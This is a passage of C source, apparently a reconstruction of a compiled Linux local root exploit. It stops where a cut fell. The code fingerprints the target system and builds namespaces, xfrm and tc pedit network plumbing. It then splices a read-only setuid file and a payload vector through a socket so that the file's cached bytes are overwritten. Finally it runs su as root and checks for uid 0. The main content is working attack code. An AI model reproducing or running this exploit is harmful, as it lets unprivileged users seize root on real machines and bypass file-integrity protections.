// SPDX-License-Identifier: GPL-2.0
/* Behavior-faithful reconstruction of runtime.c, ELF 0x402e20..0x406afb. */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <linux/capability.h>
#include <openssl/sha.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/fsuid.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/statfs.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <termios.h>
#include <unistd.h>

#include "launcher.h"
#include "profile.h"
#include "unified.h"

#ifndef F_ADD_SEALS
#define F_ADD_SEALS 1033
#define F_GET_SEALS 1034
#define F_SEAL_SEAL 0x0001
#define F_SEAL_SHRINK 0x0002
#define F_SEAL_GROW 0x0004
#define F_SEAL_WRITE 0x0008
#endif
#ifndef MFD_ALLOW_SEALING
#define MFD_ALLOW_SEALING 0x0002U
#endif
#ifndef PR_CAP_AMBIENT
#define PR_CAP_AMBIENT 47
#define PR_CAP_AMBIENT_CLEAR_ALL 4
#endif

#define EXT4_SUPER_MAGIC 0xef53UL
#define XFS_SUPER_MAGIC 0x58465342UL
#define BTRFS_SUPER_MAGIC 0x9123683eUL

struct capability_snapshot {
    uint64_t inheritable;
    uint64_t permitted;
    uint64_t effective;
    uint64_t ambient;
};

static const struct profile *selected;
static const char *launcher_request;
static const struct launcher_backend *selected_launcher;
static struct capability_snapshot public_caps_before;
static bool public_caps_before_valid;

static int read_all_fd(int fd, unsigned char **out, size_t *out_length)
{
    struct stat st;
    unsigned char *buffer;
    size_t length = 0, capacity;

    if (fstat(fd, &st) < 0 || st.st_size < 0)
        return -1;
    capacity = st.st_size ? (size_t)st.st_size + 1 : 8192;
    buffer = malloc(capacity);
    if (!buffer)
        return -1;
    if (lseek(fd, 0, SEEK_SET) < 0 && errno != ESPIPE) {
        free(buffer);
        return -1;
    }
    for (;;) {
        ssize_t n;
        if (length + 1 == capacity) {
            unsigned char *grown;
            capacity *= 2;
            grown = realloc(buffer, capacity);
            if (!grown) {
                free(buffer);
                return -1;
            }
            buffer = grown;
        }
        n = read(fd, buffer + length, capacity - length - 1);
        if (n < 0) {
            free(buffer);
            return -1;
        }
        if (n == 0)
            break;
        length += (size_t)n;
    }
    buffer[length] = 0;
    *out = buffer;
    *out_length = length;
    return 0;
}

static int capture(char *const argv[], char *out, size_t out_size,
                   char *err, size_t err_size, unsigned int timeout_seconds)
{
    int out_pipe[2], err_pipe[2], status = 0;
    pid_t pid;
    size_t out_length = 0, err_length = 0;
    unsigned int tick;

    if (!out_size || !err_size || pipe2(out_pipe, O_CLOEXEC) < 0 ||
        pipe2(err_pipe, O_CLOEXEC) < 0)
        return -1;
    fflush(NULL);
    pid = fork();
    if (pid < 0)
        return -1;
    if (pid == 0) {
        int nullfd = open("/dev/null", O_RDONLY);
        dup2(nullfd, STDIN_FILENO);
        dup2(out_pipe[1], STDOUT_FILENO);
        dup2(err_pipe[1], STDERR_FILENO);
        close(out_pipe[0]); close(out_pipe[1]);
        close(err_pipe[0]); close(err_pipe[1]);
        execv(argv[0], argv);
        _Exit(127);
    }
    close(out_pipe[1]);
    close(err_pipe[1]);
    for (tick = 0;; tick++) {
        pid_t got = waitpid(pid, &status, WNOHANG);
        if (got == pid || got < 0)
            break;
        if (tick == timeout_seconds * 20) {
            kill(pid, SIGKILL);
            waitpid(pid, &status, 0);
            status = 124 << 8;
            break;
        }
        usleep(50000);
    }
    while (out_length + 1 < out_size) {
        ssize_t n = read(out_pipe[0], out + out_length, out_size - out_length - 1);
        if (n <= 0)
            break;
        out_length += (size_t)n;
    }
    while (err_length + 1 < err_size) {
        ssize_t n = read(err_pipe[0], err + err_length, err_size - err_length - 1);
        if (n <= 0)
            break;
        err_length += (size_t)n;
    }
    out[out_length] = 0;
    err[err_length] = 0;
    close(out_pipe[0]);
    close(err_pipe[0]);
    if (WIFEXITED(status))
        return WEXITSTATUS(status);
    return WIFSIGNALED(status) ? 128 + WTERMSIG(status) : -1;
}

static int capture_pty(char *const argv[], char out[1024], char err[1024])
{
    char slave_name[128], buffer[4096] = {0};
    int master, status = 0, flags;
    pid_t pid;
    size_t used = 0, clean = 0;
    unsigned int tick;
    bool answered = false;

    err[0] = 0;
    master = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
    if (master < 0 || grantpt(master) < 0 || unlockpt(master) < 0 ||
        ptsname_r(master, slave_name, sizeof(slave_name)) != 0)
        goto fail;
    pid = fork();
    if (pid < 0)
        goto fail;
    if (pid == 0) {
        int slave;
        if (setsid() < 0 || (slave = open(slave_name, O_RDWR)) < 0 ||
            ioctl(slave, TIOCSCTTY, 0) < 0 || dup2(slave, 0) < 0 ||
            dup2(slave, 1) < 0 || dup2(slave, 2) < 0)
            _Exit(126);
        if (slave > 2)
            close(slave);
        close(master);
        execv(argv[0], argv);
        _Exit(127);
    }
    flags = fcntl(master, F_GETFL, 0);
    if (flags >= 0)
        fcntl(master, F_SETFL, flags | O_NONBLOCK);
    for (tick = 0; tick <= 100; tick++) {
        ssize_t n = read(master, buffer + used, sizeof(buffer) - used - 1);
        if (n > 0) {
            used += (size_t)n;
            buffer[used] = 0;
        }
        if (!answered && strstr(buffer, "Password:")) {
            answered = write(master, "\n\n\n", 3) == 3;
        }
        if (waitpid(pid, &status, WNOHANG) == pid)
            break;
        usleep(50000);
    }
    if (tick > 100) {
        kill(pid, SIGKILL);
        waitpid(pid, &status, 0);
        status = 124 << 8;
    }
    while (used + 1 < sizeof(buffer)) {
        ssize_t n = read(master, buffer + used, sizeof(buffer) - used - 1);
        if (n <= 0)
            break;
        used += (size_t)n;
    }
    close(master);
    for (size_t i = 0; i < used && clean < 1023; i++)
        if (buffer[i] != '\r')
            out[clean++] = buffer[i];
    out[clean] = 0;
    return WIFEXITED(status) ? WEXITSTATUS(status) : 128 + WTERMSIG(status);
fail:
    if (master >= 0)
        close(master);
    out[0] = 0;
    return -1;
}

static int read_capabilities(struct capability_snapshot *caps)
{
    static const char *names[] = { "CapInh:", "CapPrm:", "CapEff:", "CapAmb:" };
    uint64_t *values = (uint64_t *)caps;
    unsigned char *data;
    size_t length, i;
    int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);

    memset(caps, 0, sizeof(*caps));
    if (fd < 0 || read_all_fd(fd, &data, &length) < 0) {
        if (fd >= 0) close(fd);
        return -1;
    }
    close(fd);
    for (i = 0; i < 4; i++) {
        char *line = strstr((char *)data, names[i]);
        if (!line || sscanf(line + strlen(names[i]), "%16llx",
                            (unsigned long long *)&values[i]) != 1) {
            free(data);
            return -1;
        }
    }
    free(data);
    return 0;
}

static bool zero_caps(void)
{
    struct capability_snapshot caps;
    return read_capabilities(&caps) == 0 && !caps.inheritable && !caps.permitted &&
           !caps.effective && !caps.ambient;
}

static int normalize_public_capabilities(void)
{
    struct __user_cap_header_struct header = {
        .version = _LINUX_CAPABILITY_VERSION_3, .pid = 0,
    };
    struct __user_cap_data_struct data[2] = {{0}};
    struct capability_snapshot after;

    if (read_capabilities(&public_caps_before) < 0) {
        printf("CAPABILITY_NORMALIZATION=FAIL stage=read_before errno=%d\n", errno);
        return -1;
    }
    public_caps_before_valid = true;
    printf("CALLER_CAPS_BEFORE inheritable=%016llx permitted=%016llx effective=%016llx ambient=%016llx\n",
           (unsigned long long)public_caps_before.inheritable,
           (unsigned long long)public_caps_before.permitted,
           (unsigned long long)public_caps_before.effective,
           (unsigned long long)public_caps_before.ambient);
    if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_CLEAR_ALL, 0, 0, 0) < 0) {
        printf("CAPABILITY_NORMALIZATION=FAIL stage=clear_ambient errno=%d\n", errno);
        return -1;
    }
    if (syscall(SYS_capset, &header, data) < 0) {
        printf("CAPABILITY_NORMALIZATION=FAIL stage=capset errno=%d\n", errno);
        return -1;
    }
    if (read_capabilities(&after) < 0) {
        printf("CAPABILITY_NORMALIZATION=FAIL stage=read_after errno=%d\n", errno);
        return -1;
    }
    printf("CALLER_CAPS_AFTER inheritable=%016llx permitted=%016llx effective=%016llx ambient=%016llx\n",
           (unsigned long long)after.inheritable, (unsigned long long)after.permitted,
           (unsigned long long)after.effective, (unsigned long long)after.ambient);
    if (after.inheritable || after.permitted || after.effective || after.ambient) {
        puts("CAPABILITY_NORMALIZATION=FAIL stage=verify_zero errno=0");
        return -1;
    }
    printf("CAPABILITY_NORMALIZATION=PASS changed=%d\n",
           memcmp(&public_caps_before, &after, sizeof(after)) != 0);
    return 0;
}

static bool file_contains(const char *path, const char *needle)
{
    unsigned char *data;
    size_t length;
    bool found;
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0 || read_all_fd(fd, &data, &length) < 0) {
        if (fd >= 0) close(fd);
        return false;
    }
    close(fd);
    found = strstr((char *)data, needle) != NULL;
    free(data);
    return found;
}

static bool csv_has(const char *csv, const char *value)
{
    size_t length;
    if (!csv || !value)
        return false;
    length = strlen(value);
    while (*csv) {
        const char *comma = strchr(csv, ',');
        size_t item_length = comma ? (size_t)(comma - csv) : strlen(csv);
        if (item_length == length && memcmp(csv, value, length) == 0)
            return true;
        if (!comma)
            break;
        csv = comma + 1;
    }
    return false;
}

static int hash_path(const char *path, char hex[65])
{
    unsigned char *data, digest[SHA256_DIGEST_LENGTH];
    size_t length, i;
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0 || read_all_fd(fd, &data, &length) < 0) {
        if (fd >= 0) close(fd);
        return -1;
    }
    close(fd);
    SHA256(data, length, digest);
    free(data);
    for (i = 0; i < sizeof(digest); i++)
        sprintf(hex + i * 2, "%02x", digest[i]);
    hex[64] = 0;
    return 0;
}

static bool supplementary_groups_allowed(gid_t primary, const char *allowed)
{
    gid_t *groups;
    int count = getgroups(0, NULL), i;
    char text[32];
    if (count < 0)
        return false;
    if (count == 0)
        return true;
    groups = calloc((size_t)count, sizeof(*groups));
    if (!groups || getgroups(count, groups) != count) {
        free(groups);
        return false;
    }
    for (i = 0; i < count; i++) {
        if (groups[i] == primary)
            continue;
        snprintf(text, sizeof(text), "%u", groups[i]);
        if (!allowed || !csv_has(allowed, text)) {
            free(groups);
            return false;
        }
    }
    free(groups);
    return true;
}

static bool os_release_equals(const char *key, const char *expected)
{
    char line[512];
    FILE *stream = fopen("/etc/os-release", "r");
    if (!stream)
        return false;
    while (fgets(line, sizeof(line), stream)) {
        char *equals = strchr(line, '=');
        if (equals && (size_t)(equals - line) == strlen(key) &&
            memcmp(line, key, strlen(key)) == 0) {
            char *value = equals + 1;
            value[strcspn(value, "\r\n")] = 0;
            if (*value == '"' && value[1]) {
                size_t n = strlen(value);
                if (n > 1 && value[n - 1] == '"') {
                    value[n - 1] = 0;
                    value++;
                }
            }
            fclose(stream);
            return strcmp(value, expected) == 0;
        }
    }
    fclose(stream);
    return false;
}

static const char *executable(const char *first, const char *second)
{
    if (access(first, X_OK) == 0)
        return first;
    return access(second, X_OK) == 0 ? second : NULL;
}

static int command(char *const argv[])
{
    char out[4096], err[4096];
    int rc = capture(argv, out, sizeof(out), err, sizeof(err), 8);
    if (rc != 0)
        fprintf(stderr, "COMMAND_FAIL path=%s status=%d stdout=%s stderr=%s\n",
                argv[0], rc, out, err);
    return rc;
}

static int write_one(const char *path)
{
    int fd = open(path, O_WRONLY | O_CLOEXEC);
    int ok = fd >= 0 && write(fd, "1\n", 2) == 2;
    if (fd >= 0) close(fd);
    return ok ? 0 : -1;
}

static int network_setup(void)
{
    const char *ip = executable("/usr/sbin/ip", "/sbin/ip");
    const char *tc = executable("/usr/sbin/tc", "/sbin/tc");
    char *link_lo[] = { (char *)ip, "link", "set", "lo", "up", NULL };
    char *add_nlmon[] = { (char *)ip, "link", "add", "nlmon0", "type", "nlmon", NULL };
    char *up_nlmon[] = { (char *)ip, "link", "set", "nlmon0", "up", NULL };
    char *state[] = { (char *)ip, "xfrm", "state", "add", "src", "127.0.0.1",
        "dst", "127.0.0.1", "proto", "esp", "spi", "0x100", "mode", "transport",
        "replay-window", "0", "auth-trunc", "hmac(sha256)",
        "0x404142434445464748494a4b4c4d4e4f505152535455565758595a5b5c5d5e5f",
        "128", "enc", "cbc(aes)", "0x000102030405060708090a0b0c0d0e0f", NULL };
    char *policy[] = { (char *)ip, "xfrm", "policy", "add", "dir", "in",
        "src", "127.0.0.1/32", "dst", "127.0.0.1/32", "tmpl", "src", "127.0.0.1",
        "dst", "127.0.0.1", "proto", "esp", "spi", "0x100", "mode", "transport", NULL };

    if (!ip || command(link_lo) || command(add_nlmon) || command(up_nlmon) ||
        command(state) || command(policy))
        return -1;
    if (!strcmp(selected->tc_mode, "embedded_u32"))
        return selected->tc_frame_length == 88
            ? tc_netlink_setup_88(selected->tc_frame, 88)
            : tc_netlink_setup_96(selected->tc_frame, 96);
    if (!tc)
        return -1;
    {
        char *qdisc[] = { (char *)tc, "qdisc", "add", "dev", "nlmon0", "clsact", NULL };
        char offsets[24][8], values[24][16];
        char *argv[13 + 24 * 6 + 8 + 1];
        size_t i, n = 0, keys = selected->tc_frame_length / 4;

        if (command(qdisc))
            return -1;
        argv[n++] = (char *)tc; argv[n++] = "filter"; argv[n++] = "add";
        argv[n++] = "dev"; argv[n++] = "nlmon0"; argv[n++] = "egress";
        argv[n++] = "protocol"; argv[n++] = "all"; argv[n++] = "pref";
        argv[n++] = "1"; argv[n++] = "matchall"; argv[n++] = "action";
        argv[n++] = "pedit";
        for (i = 0; i < keys; i++) {
            uint32_t word;
            memcpy(&word, selected->tc_frame + i * 4, 4);
            snprintf(offsets[i], sizeof(offsets[i]), "%zu", i * 4);
            snprintf(values[i], sizeof(values[i]), "0x%08x", ntohl(word));
            argv[n++] = "munge"; argv[n++] = "offset"; argv[n++] = offsets[i];
            argv[n++] = "u32"; argv[n++] = "set"; argv[n++] = values[i];
        }
        argv[n++] = "pipe"; argv[n++] = "action"; argv[n++] = "mirred";
        argv[n++] = "egress"; argv[n++] = "redirect"; argv[n++] = "dev";
        argv[n++] = "lo"; argv[n] = NULL;
        {
            int rc = command(argv);
            if (rc == 0)
                printf("TC_EXTERNAL_SETUP device=nlmon0 hook=egress "
                       "classifier=matchall pedit_keys=%zu redirect=lo status=PASS\n",
                       keys);
            return rc;
        }
    }
}

static int inherited_profile(void)
{
    uint32_t index;
    struct stat target_fd, target_path, vector;
    uint8_t bytes[40], slice[8];
    int seals = fcntl(PROFILE_FD, F_GET_SEALS);

    if (seals < 0 || (seals & 0xf) != 0xf ||
        pread(PROFILE_FD, &index, sizeof(index), 0) != sizeof(index) ||
        index >= compiled_profile_count)
        return -1;
    selected = &compiled_profiles[index];
    if (fstat(TARGET_FD, &target_fd) < 0 || stat(selected->target_path, &target_path) < 0 ||
        target_fd.st_dev != target_path.st_dev || target_fd.st_ino != target_path.st_ino ||
        (fcntl(TARGET_FD, F_GETFL) & O_ACCMODE) != O_RDONLY ||
        fstat(VECTOR_FD, &vector) < 0 || vector.st_size != VECTOR_BYTES ||
        pread(TARGET_FD, bytes, sizeof(bytes), (off_t)selected->target_offset - 16) != sizeof(bytes) ||
        pread(TARGET_FD, slice, sizeof(slice), (off_t)selected->target_offset) != sizeof(slice) ||
        memcmp(slice, selected->original_slice, sizeof(slice)) != 0)
        return -1;
    return 0;
}

static int install_fds(const struct profile *profile)
{
    uint32_t index = (uint32_t)(profile - compiled_profiles);
    int profile_fd = -1, self_fd = -1, target_fd = -1, vector_fd = -1;
    int seals = F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE;

    int p = -1, s = -1, t = -1, v = -1;

    profile_fd = memfd_create("unified-profile", MFD_ALLOW_SEALING);
    target_fd = open(profile->target_path, O_RDONLY | O_CLOEXEC);
    vector_fd = memfd_create("unified-vector", MFD_ALLOW_SEALING);
    self_fd = open("/proc/self/exe", O_RDONLY | O_CLOEXEC);
    if (profile_fd < 0 || target_fd < 0 || vector_fd < 0 || self_fd < 0)
        goto fail;

    /* Sources land on 3..6 but the slots are 3(profile), 4(self),
     * 5(target), 6(vector).  Move every source above the slots first so the
     * dup2() sequence cannot clobber a source that already occupies a slot. */
    p = fcntl(profile_fd, F_DUPFD, 10);
    s = fcntl(self_fd, F_DUPFD, 10);
    t = fcntl(target_fd, F_DUPFD, 10);
    v = fcntl(vector_fd, F_DUPFD, 10);
    close(profile_fd); close(self_fd); close(target_fd); close(vector_fd);
    profile_fd = self_fd = target_fd = vector_fd = -1;
    if (p < 0 || s < 0 || t < 0 || v < 0)
        goto fail;
    if (write(p, &index, sizeof(index)) != sizeof(index) ||
        write(v, profile->mutation_vector, VECTOR_BYTES) != VECTOR_BYTES ||
        fcntl(p, F_ADD_SEALS, seals) < 0 ||
        fcntl(v, F_ADD_SEALS, seals) < 0)
        goto fail;
    if (dup2(p, PROFILE_FD) < 0 || dup2(s, SELF_FD) < 0 ||
        dup2(t, TARGET_FD) < 0 || dup2(v, VECTOR_FD) < 0)
        goto fail;
    close(p); close(s); close(t); close(v);
    for (int fd = PROFILE_FD; fd <= VECTOR_FD; fd++)
        fcntl(fd, F_SETFD, 0);
    return 0;
fail:
    if (profile_fd >= 0) close(profile_fd);
    if (self_fd >= 0) close(self_fd);
    if (target_fd >= 0) close(target_fd);
    if (vector_fd >= 0) close(vector_fd);
    if (p >= 0) close(p);
    if (s >= 0) close(s);
    if (t >= 0) close(t);
    if (v >= 0) close(v);
    return -1;
}

static int self_path(char path[4096])
{
    ssize_t n = readlink("/proc/self/exe", path, 4095);
    if (n <= 0)
        return -1;
    path[n] = 0;
    return 0;
}

static int consumer(const struct profile *profile, char out[1024], char err[1024])
{
    const char *su = executable("/usr/bin/su", "/bin/su");
    if (!su)
        return -1;
    if (!strcmp(profile->consumer_mode, "pty_su")) {
        char *argv[] = { (char *)su, "-s", "/bin/sh", "root", "-c", "/usr/bin/id -u", NULL };
        return capture_pty(argv, out, err);
    }
    {
        char *argv[] = { (char *)su, "--shell", "/usr/bin/id", "--", "root", "-u", NULL };
        return capture(argv, out, 1024, err, 1024, 5);
    }
}

static int drop_all_caps(void)
{
    struct __user_cap_header_struct header = {
        .version = _LINUX_CAPABILITY_VERSION_3, .pid = 0,
    };
    struct __user_cap_data_struct data[2] = {{0}};
    for (int cap = 0; cap < 64; cap++)
        if (prctl(PR_CAPBSET_DROP, cap, 0, 0, 0) < 0 && errno != EINVAL)
            return -1;
    if (syscall(SYS_capset, &header, data) < 0 ||
        prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) < 0)
        return -1;
    return zero_caps() ? 0 : -1;
}

static int mutate_stage(void)
{
    struct sockaddr_in address = { .sin_family = AF_INET, .sin_port = htons(5555) };
    uint8_t before[40], after[40];
    off_t target_offset, vector_offset = 0;
    int receiver = -1, sender = -1, pipefd[2], status;
    pid_t child;

    if (drop_all_caps() < 0 ||
        pread(TARGET_FD, before, sizeof(before), (off_t)selected->target_offset - 16) != sizeof(before) ||
        inet_pton(AF_INET, "127.0.0.1", &address.sin_addr) != 1)
        return 1;
    receiver = socket(AF_INET, SOCK_DGRAM, 0);
    sender = socket(AF_INET, SOCK_DGRAM, 0);
    if (receiver < 0 || sender < 0 || bind(receiver, (struct sockaddr *)&address, sizeof(address)) < 0 ||
        connect(sender, (struct sockaddr *)&address, sizeof(address)) < 0 || pipe(pipefd) < 0)
        return 1;
    child = fork();
    if (child < 0)
        return 1;
    if (child == 0) {
        uint8_t packet[640];
        ssize_t r;
        alarm(5);
        r = recv(receiver, packet, sizeof(packet), 0);
        fprintf(stderr, "CHILD recv=%zd errno=%d\n", r, errno);
        _Exit(r < 0);
    }
    close(receiver);
    target_offset = (off_t)selected->target_offset;
    {
        ssize_t a = splice(TARGET_FD, &target_offset, pipefd[1], NULL, TARGET_BYTES, 0);
        ssize_t b = splice(VECTOR_FD, &vector_offset, pipefd[1], NULL, VECTOR_BYTES, 0);
        ssize_t c = splice(pipefd[0], NULL, sender, NULL, TOTAL_BYTES, 0);
        fprintf(stderr, "SPLICE a=%zd b=%zd c=%zd errno=%d\n", a, b, c, errno);
        if (a != TARGET_BYTES || b != VECTOR_BYTES || c != TOTAL_BYTES)
            return 1;
    }
    fprintf(stderr, "SPLICE_OK target_off=0x%llx\n", (unsigned long long)target_offset);
    close(pipefd[0]); close(pipefd[1]); close(sender);
    waitpid(child, &status, 0);
    usleep(500000);
    system("echo '--- tc ---' >&2; tc -s filter show dev nlmon0 egress >&2; "
           "echo '--- snmp ---' >&2; cat /proc/net/snmp >&2; "
           "echo '--- xfrm ---' >&2; cat /proc/net/xfrm_stat >&2");
    if (pread(TARGET_FD, after, sizeof(after), (off_t)selected->target_offset - 16) != sizeof(after))
        return 2;
    fprintf(stderr, "MUTATE before=%02x%02x%02x%02x%02x%02x%02x%02x after=%02x%02x%02x%02x%02x%02x%02x%02x\n",
            before[16], before[17], before[18], before[19], before[20], before[21], before[22], before[23],
            after[16], after[17], after[18], after[19], after[20], after[21], after[22], after[23]);
    if (memcmp(before + 16, selected->original_slice, 8) == 0 &&
        memcmp(before, after, 16) == 0 && memcmp(before + 24, after + 24, 16) == 0 &&
        memcmp(after + 16, selected->desired_slice, 8) == 0 &&
        memcmp(after + 16, before + 16, 8) != 0) {
        puts("TRIGGER changed=1 guards_ok=1 target_exact=1 caps=zero no_new_privs=1");
        return 0;
    }
    return 2;
}

static int netns_stage(void);

/* Like inherited_profile() but skips the dev/inode path check.
 * Used when TARGET_FD points to the host file but target_path resolves
 * to a different inode (e.g. snap overlay with core24 rootfs). */
static int snap_inherited_profile(void)
{
    uint32_t index;
    struct stat vector;
    uint8_t slice[8];
    int seals = fcntl(PROFILE_FD, F_GET_SEALS);

    if (seals < 0 || (seals & 0xf) != 0xf ||
        pread(PROFILE_FD, &index, sizeof(index), 0) != sizeof(index) ||
        index >= compiled_profile_count)
        return -1;
    selected = &compiled_profiles[index];
    if (!selected->allow_seccomp)
        return -1;
    if ((fcntl(TARGET_FD, F_GETFL) & O_ACCMODE) != O_RDONLY ||
        fstat(VECTOR_FD, &vector) < 0 || vector.st_size != VECTOR_BYTES ||
        pread(TARGET_FD, slice, sizeof(slice), (off_t)selected->target_offset) != sizeof(slice) ||
        memcmp(slice, selected->original_slice, sizeof(slice)) != 0)
        return -1;
    return 0;
}

static int snap_probe(void)
{
    if (snap_inherited_profile() < 0)
        return 2;
    puts("LAUNCHER_PROBE result=PASS control_plane=PASS trigger_attempted=0");
    return 0;
}

static int snap_stage(void)
{
    char buf[64];
    uid_t uid;
    gid_t gid;
    int fd;

    if (snap_inherited_profile() < 0)
        return 2;

    uid = getuid();
    gid = getgid();

    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0)
        return 2;

    fd = open("/proc/self/setgroups", O_WRONLY | O_CLOEXEC);
    if (fd < 0 || write(fd, "deny", 4) != 4) {
        if (fd >= 0) close(fd);
        return 2;
    }
    close(fd);

    snprintf(buf, sizeof(buf), "0 %u 1\n", (unsigned)uid);
    fd = open("/proc/self/uid_map", O_WRONLY | O_CLOEXEC);
    if (fd < 0 || write(fd, buf, strlen(buf)) != (ssize_t)strlen(buf)) {
        if (fd >= 0) close(fd);
        return 2;
    }
    close(fd);

    snprintf(buf, sizeof(buf), "0 %u 1\n", (unsigned)gid);
    fd = open("/proc/self/gid_map", O_WRONLY | O_CLOEXEC);
    if (fd < 0 || write(fd, buf, strlen(buf)) != (ssize_t)strlen(buf)) {
        if (fd >= 0) close(fd);
        return 2;
    }
    close(fd);

    return netns_stage();
}

static int netns_stage(void)
{
    char *nfq_argv[] = { "nf_queue", "-q", "0", "-t", "8", NULL };
    pid_t helper;
    int rc, status;

    if ((!selected && inherited_profile() < 0) || nft_helper_main() != 0 ||
        write_one("/proc/sys/net/ipv4/conf/lo/route_localnet") < 0 ||
        write_one("/proc/sys/net/ipv4/conf/lo/accept_local") < 0 || network_setup() < 0)
        return 2;
    fflush(NULL);
    helper = fork();
    if (helper < 0)
        return 2;
    if (helper == 0)
        _Exit(nfq_helper_main(5, nfq_argv));
    sleep(1);
    rc = mutate_stage();
    kill(helper, SIGTERM);
    waitpid(helper, &status, 0);
    return rc;
}

static bool target_build_id_once(const struct profile *profile)
{
    unsigned char build_id[20], *data;
    size_t length, hits = 0, i;
    int fd = open(profile->target_path, O_RDONLY | O_CLOEXEC);
    if (fd < 0 || read_all_fd(fd, &data, &length) < 0) {
        if (fd >= 0) close(fd);
        return false;
    }
    close(fd);
    for (i = 0; i < sizeof(build_id); i++) {
        unsigned int value;
        if (sscanf(profile->target_build_id + i * 2, "%2x", &value) != 1) {
            free(data);
            return false;
        }
        build_id[i] = (unsigned char)value;
    }
    for (i = 0; i + sizeof(build_id) <= length; i++)
        if (memcmp(data + i, build_id, sizeof(build_id)) == 0)
            hits++;
    free(data);
    return hits == 1;
}

static bool pam_rule_once(void)
{
    char line[1024], a[64], b[64], c[256], extra[64];
    int matches = 0;
    FILE *stream = fopen("/etc/pam.d/su", "r");
    if (!stream)
        stream = fopen("/usr/lib/pam.d/su", "r");
    if (!stream)
        return false;
    while (fgets(line, sizeof(line), stream))
        if (sscanf(line, "%63s %63s %255s %63s", a, b, c, extra) == 3 &&
            !strcmp(a, "auth") && !strcmp(b, "sufficient") && !strcmp(c, "pam_rootok.so"))
            matches++;
    fclose(stream);
    return matches == 1;
}

static bool lsm_matches(const char *constraint)
{
    char out[64], err[128], mode[64], *context;
    if (!strcmp(constraint, "none"))
        return true;
    if (!strncmp(constraint, "apparmor:", 9))
        return file_contains("/proc/self/attr/current", constraint + 9);
    if (!strncmp(constraint, "selinux:", 8)) {
        char *getenforce[] = { "/usr/sbin/getenforce", NULL };
        snprintf(mode, sizeof(mode), "%s", constraint + 8);
        context = strchr(mode, ':');
        if (context)
            *context++ = 0;
        if (capture(getenforce, out, sizeof(out), err, sizeof(err), 5) != 0 ||
            strncmp(out, mode, strlen(mode)) != 0)
            return false;
        return !context || file_contains("/proc/self/attr/current", context);
    }
    return false;
}

static bool profile_identity_matches(const struct profile *profile)
{
    if (!profile->flexible_identity)
        return getuid() == profile->expected_uid && geteuid() == profile->expected_uid &&
               getgid() == profile->expected_gid && getegid() == profile->expected_gid &&
               (!profile->check_supplementary_groups ||
                supplementary_groups_allowed(profile->expected_gid,
                                             profile->allowed_supplementary_groups));
    {
        uid_t ruid, euid, suid;
        gid_t rgid, egid, sgid;
        if (getresuid(&ruid, &euid, &suid) < 0 || getresgid(&rgid, &egid, &sgid) < 0 ||
            (uint32_t)(ruid - 1000) >= 0xfc16U ||
            (uint32_t)(rgid - 1000) >= 0xfc16U ||
            ruid != euid || ruid != suid || rgid != egid || rgid != sgid ||
            (uid_t)setfsuid((uid_t)-1) != ruid ||
            (gid_t)setfsgid((gid_t)-1) != rgid ||
            (profile->check_supplementary_groups &&
             !supplementary_groups_allowed(rgid, profile->allowed_supplementary_groups)) ||
            !public_caps_before_valid || public_caps_before.inheritable ||
            public_caps_before.permitted || public_caps_before.effective || public_caps_before.ambient)
            return false;
        return true;
    }
}

static unsigned long filesystem_magic(const char *name)
{
    if (!strcmp(name, "ext4")) return EXT4_SUPER_MAGIC;
    if (!strcmp(name, "xfs")) return XFS_SUPER_MAGIC;
    if (!strcmp(name, "btrfs")) return BTRFS_SUPER_MAGIC;
    return 0;
}

static bool profile_matches(const struct profile *profile, bool allow_mutated,
                            char hash[65])
{
    struct utsname un;
    struct stat st;
    struct statfs fs;
    char out[256], err[256];
    char *dpkg[] = { "/usr/bin/dpkg-query", "-W", "-f=${Version}",
                     (char *)profile->package_name, NULL };
    char *rpm[] = { "/usr/bin/rpm", "-q", "--qf", "%{EVR}",
                    (char *)profile->package_name, NULL };
    char **query = !strcmp(profile->package_query, "dpkg") ? dpkg : rpm;
    int writable;

    if (!zero_caps() || !profile_identity_matches(profile) || uname(&un) < 0 ||
        strcmp(un.machine, "x86_64") || !csv_has(profile->kernel_releases, un.release) ||
        !os_release_equals("ID", profile->distribution_id) ||
        !os_release_equals("VERSION_ID", profile->distribution_version) ||
        statfs(profile->target_path, &fs) < 0 ||
        (unsigned long)fs.f_type != filesystem_magic(profile->filesystem) ||
        capture(query, out, sizeof(out), err, sizeof(err), 5) != 0 ||
        !csv_has(profile->package_versions, out) || stat(profile->target_path, &st) < 0 ||
        st.st_uid != profile->target_uid || st.st_gid != profile->target_gid ||
        (st.st_mode & 07777) != profile->target_mode ||
        (uint64_t)st.st_size != profile->target_size ||
        !file_contains("/proc/self/status", "NoNewPrivs:\t0") ||
        (!profile->allow_seccomp && !file_contains("/proc/self/status", "Seccomp:\t0")) ||
        !lsm_matches(profile->lsm_constraint))
        return false;
    errno = 0;
    writable = open(profile->target_path, O_WRONLY | O_CLOEXEC);
    if (writable >= 0) {
        close(writable);
        return false;
    }
    if (errno != EACCES || hash_path(profile->target_path, hash) < 0 ||
        (strcmp(hash, profile->baseline_sha256) != 0 &&
         (!allow_mutated || strcmp(hash, profile->mutated_sha256) != 0)) ||
        !target_build_id_once(profile) || !pam_rule_once() ||
        !executable("/usr/bin/unshare", "/bin/unshare") ||
        !executable("/usr/sbin/ip", "/sbin/ip") || !executable("/usr/bin/su", "/bin/su"))
        return false;
    /* For launcher-dependent profiles, require at least one listed launcher installed. */
    if (!strcmp(profile->execution_mode, "ubuntu_optional_launcher") &&
        profile->automatic_launchers && profile->automatic_launchers[0]) {
        char list[512], *save = NULL, *name;
        bool any = false;
        snprintf(list, sizeof(list), "%s", profile->automatic_launchers);
        for (name = strtok_r(list, ",", &save); name && !any;
